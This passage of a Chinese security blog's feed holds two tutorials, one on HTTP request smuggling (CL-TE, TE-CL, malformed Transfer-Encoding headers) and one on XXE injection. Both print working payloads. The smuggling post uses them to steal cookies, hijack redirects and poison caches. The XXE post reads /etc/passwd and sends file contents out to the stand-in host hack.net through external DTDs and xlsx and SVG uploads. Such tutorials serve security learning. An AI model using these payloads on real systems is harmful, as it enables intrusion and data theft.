    <content type="html"><![CDATA[<p>聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）</p><p>一种是通过 <code>Content-Length</code> 请求头 的值界定请求体的长度，另一种是在<a href="https://zh.wikipedia.org/zh-hans/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">分块传输</a>时，通过 <code>Transfer-Encoding: chunked</code> 请求头与请求体最后一行的 <code>0\r\n\r\n</code> 来标识该请求的结束(不计入请求体长度)</p><p>按照<a href="https://tools.ietf.org/html/rfc2616#section-4.4">HTTP/1.1规范标准</a>，这两种请求头同时存在时应该忽略 <code>Content-Length</code> 而以分块传输为准，但是对于反代链中的多个服务器而言，可能有些并不支持分块传输请求头、有些对于标准规范的实现并未足够精细，在处理一些畸形请求头时会有非预期的效果。</p><blockquote><p>为了方便表述，接下来均将用于反向代理的服务器称为前端，隐藏在反代服务器之后用于提供具体业务的服务器称为后端。用 <code>CL-TE</code> 表示前端以 <code>Content-Length</code> 作为请求结束界定标准、<code>TE-CL</code> 表示前端以 <code>Transfer-Encoding</code> 作为请求结束界定标准。</p></blockquote><p>HTTP请求走私漏洞正是由于前后端服务器界定标准不一致导致的，利用HTTP请求走私使得 <code>一次攻击</code> 在前端服务器识别为 <code>一个请求</code> ，但传送到后端服务器时其误认为这是用了<a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96">pipelining</a>，而将其识别为 <code>两个不同的请求</code>。</p><ul><li>更深入的细节原理，涉及到反代和后端对于消息的处理机制，这部分现在还不懂，以后懂了再单独分析</li></ul><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 50</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端读取 <code>CL</code> 值为50，会将这一整段视为一个请求转发至后端( <code>0</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>后端接收时以 <code>TE</code> 作为界定标准，将 <code>0\r\n\r\n</code> 视为一个请求的结束，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的包结构并不完整，所以后端认为这份数据还没有接收完毕，会继续将随后到来的请求拼接进去</p></li><li><p>注意 <code>CL</code> 取值为50时，是截止到最后一行的最后一个字母 <code>t</code> 的，也就是说 <code>t</code> 后面并不存在 <code>\r\n</code> 这对回车换行符，那么后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"></span><br><span class="line">q=something</span><br></pre></td></tr></table></figure><p>这就导致了后续对 <code>/search</code> 的访问，因为请求行被吃进了 <code>X-Ignore</code> 这个请求头的值中，拼接后实际变成了对 <code>/404</code> 的访问。</p><p>从理论上来说，我们可以发出请求走私攻击包后，紧接着发送一个正常请求，根据后者不正常的响应差异来判断漏洞存在。</p><p>在实战中我们的攻击请求和紧接着发送的正常请求之间，很可能会有其他人的某个请求刚好插在了中间，这样我们本来期待用于判断漏洞的不正常响应就会被回复给别人，影响别人正常使的同时还会导致我们误以为没洞，所以最好避开高峰期多试几次。</p><ul><li>或者<a href="https://portswigger.net/web-security/request-smuggling/finding">基于响应时间来判断</a></li></ul><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端以 <code>TE</code> 作为界定标准，会将这一整段视为一个请求转发至后端( <code>q=something</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>前端读取 <code>CL</code> 值为13，认为第一个请求截止到 <code>q=something</code>，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的 <code>CL</code> 值为15，所以后端认为这份数据还没有接收完毕，会继续在随后到来的请求中取出5个字符拼接进去</p></li><li><p>后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">POST[空格]</span></span><br></pre></td></tr></table></figure><p>于是就使得后续请求被截断，剩下的不完整部分会被视为无效请求丢弃，最终会得到一个不正常的响应。（同样存在前文中说的竞争问题，缓解方法一样）</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>从原理来看前后端标准一致时是不存在请求走私的，但如果一个接受畸形 <code>TE</code> 认为是分块传输，一个不接受畸形 <code>TE</code> 而按照 <code>CL</code> 的值作为请求结束界定标准，这种细微差异同样会导致请求走私，PortSwigger 提供了部分在实战中成功利用过的畸形头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: xchunked</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding : chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: x</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding:[tab]chunked</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span></span><br><span class="line"><span class="attribute"></span>: chunked</span><br></pre></td></tr></table></figure><ul><li>在<a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">Burp插件</a>中存在更多畸形 <code>TE</code> 头用于Fuzz，可以自动计算 <code>CL</code> 长度和配合 <code>Turbo Intruder</code> 光速发包，真香</li></ul><p>利用畸形 <code>TE</code> 导致的差异化解析，最终还是会对应 <code>CL-TE</code> 或 <code>TE-CL</code> 的情况，就不再贴数据包了(就是改一下 <code>TE</code> 头)。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>最直接的就是用来绕过前端的安全访问控制，让走私的请求直达业务逻辑后端。但是实战中可能没有这么理想化，比如后端还是会校验 <code>client-ip</code> 、 <code>x-forwarded-for</code> 或是反代加的自定义请求头，这时就需要找到一个能够回显请求体参数的地方，利用请求走私中的第二个 <code>不完整</code> 请求吃掉紧接而来的下一个请求，通过直接或间接的回显读到需要的请求头。</p><p>比如在一个搜索功能中，POST请求的 <code>q</code> 参数的内容表示搜索的字符串，这个字符串在搜索页会被 <code>直接回显</code> 或是存储到搜索记录中 <code>间接回显</code>。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 159</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 200</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=something</span><br></pre></td></tr></table></figure><p>重点注意第二个走私请求中 <code>CL</code> 值被设置得偏大，且有回显的 <code>q</code> 参数被移到了末尾，后端随后紧接而来的请求实际上会被拼接成这种样子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=somethingPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xx.net</span><br><span class="line"><span class="attribute">X-Secret-Header</span>: 666</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>...</code>中有多少内容取决于走私请求中 <code>CL</code> 值的大小，建议根据需要慢慢调大，避免过大导致超时(在这个例子中我们已经读到了需要的 <code>X-Secret-Header: 666</code> 这个前端服务器自定义校验头)，但是调大 <code>CL</code> 值能读到的东西最多截止到遇到 <code>&amp;</code> 时（想想HTTP请求用什么符号区分不同参数？我们能回显什么参数？）</p><p>至于这个 <code>随后紧接而来的请求</code> 该由我们发出，还是守株待兔等着别人的访问请求进坑，就要看具体的目的是什<br>么了。</p><h3 id="窃取Cookie"><a href="#窃取Cookie" class="headerlink" title="窃取Cookie"></a>窃取Cookie</h3><p>如果是想要打到别人的私有请求头(比如 <code>Cookie</code> 之类的)，那就得等人进坑且需要一个存储型的间接回显点，因为一次性的直接回显会直接响应给受害者，我们是看不到的。</p><ul><li>存储型间接回显点举例:搜索记录、个人简介、发布文章、发布评论、发送私信</li></ul><h3 id="水坑型XSS"><a href="#水坑型XSS" class="headerlink" title="水坑型XSS"></a>水坑型XSS</h3><p>如果实在没有存储型间接回显点的话，那就充分利用一次性直接回显这个特点，配合一个反射型XSS使其变为无条件触发的 <code>水坑型XSS</code> （我自己编的名）</p><ul><li>反射型XSS漏洞点可以是常规的GET或POST参数，同样也可以是像 <code>User-Agent</code> 头这种self触发点，因为结合请求走私我们可以实现将它强加给下一个访问的受害者</li></ul><h3 id="任意重定向"><a href="#任意重定向" class="headerlink" title="任意重定向"></a>任意重定向</h3><p>如果配合 <code>Apache</code> 和 <code>IIS</code> 会将无斜杠路径通过重定向方式添加斜杠的特性，就可以再次利用请求走私给下一个访问的受害者强加头部，通过重定向将其劫持到任意域名下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /evil HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/evil</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /a.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存投毒"><a href="#Web缓存投毒" class="headerlink" title="Web缓存投毒"></a>Web缓存投毒</h3><p>同时，对于 <code>/a.js</code> 的访问请求还可能被缓存下来，使得之后每个不受请求走私影响的后续请求，同样受到重定向劫持的影响，进一步造成Web缓存投毒：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/a.js</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存水坑"><a href="#Web缓存水坑" class="headerlink" title="Web缓存水坑"></a>Web缓存水坑</h3><p>回过头来，之前没找到回显点打敏感数据的话，也可以再再次利用请求走私给下一个访问的受害者强加头部，结合Web缓存特性将其敏感数据缓存下来窃取。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /getapikey HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/getapikey</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /any.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line"><span class="attribute">Cookie</span>: sessionId=balabalabala</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>受害者的 <code>/getapikey</code> 中的信息会被缓存至 <code>/any.js</code> 中，但是一个问题是攻击者并不知道受害者是访问的 <code>/any.js</code>，所以可能需要遍历几乎所有静态文件分析= =</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）&lt;/p&gt;
&lt;p&gt;一种是通过 &lt;code&gt;Content-Length&lt;/code&gt; 请求头 的值界定请求体的长度，另一种是在&lt;a href=&quot;https://zh.wikip</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="smuggling" scheme="https://hosch3n.github.io/tags/smuggling/"/>
    
  </entry>
  
  <entry>
    <title>XML基础与XXE注入</title>
    <link href="https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/"/>
    <id>https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/</id>
    <published>2020-08-16T13:32:00.000Z</published>
    <updated>2020-09-09T18:22:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种被设计用来存储和传输数据的语言，叫作<em>可扩展标记语言</em>，通过自定义标签的形式描述数据。</p><h3 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h3><p>为了区分开表示数据的尖括号和表示结构的标签，在数据中用<code>&amp;lt;</code>和<code>&amp;gt;</code>这类预定义的XML实体来表示左右尖括号。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>XML通过头部的DTD（文档类型定义）来定义文档结构，实际内容直接写在文档里的DTD叫作<code>内部DTD</code>，实际内容放在外面，要通过引用加载的DTD叫作<code>外部DTD</code>，二者可以在XML中混用。</p><h3 id="自定义实体"><a href="#自定义实体" class="headerlink" title="自定义实体"></a>自定义实体</h3><p>如果预定义的XML实体不够用，就可以自定义新的XML实体：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY id &quot;hosch3n&quot; &gt; ]&gt;</code></p><p>这样就可以用<code>&amp;id;</code>表示<code>hosch3n</code>这个值。</p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>自定义实体的实际内容不一定要写在DTD里，也可以写在外面然后通过引用加载：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY ext SYSTEM &quot;http://xxx.com&quot; &gt; ]&gt;</code></p><ul><li>支持http、ftp、file等协议</li></ul><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="OAST"><a href="#OAST" class="headerlink" title="OAST"></a>OAST</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;hack.net&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://hack.net/hack.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><ul><li>数据在服务器端拼接进XML文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Apache-POI"><a href="#Apache-POI" class="headerlink" title="Apache POI"></a>Apache POI</h3><ul><li>文件上传xlsx文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># xxe.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://hack.net/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># [Content_Types].xml</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://hack.net/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ZIP压缩后改后缀为<code>xlsx</code></p><h3 id="Apache-Batik"><a href="#Apache-Batik" class="headerlink" title="Apache Batik"></a>Apache Batik</h3><ul><li>文件上传SVG头像</li></ul><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;XML基础&lt;/h2&gt;&lt;p&gt;XML是一种被设计用来存储和传输数据的语言，叫作&lt;em&gt;可扩展标记语言&lt;/em&gt;，通过自定义标签的形式描述数据。&lt;/</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XML" scheme="https://hosch3n.github.io/tags/XML/"/>
    
    <category term="XXE" scheme="https://hosch3n.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>建立WebSocket连接</title>
    <link href="https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/"/>
    <id>https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/</id>
    <published>2020-08-16T12:33:06.000Z</published>
    <updated>2020-09-24T16:14:02.816Z</updated>
    
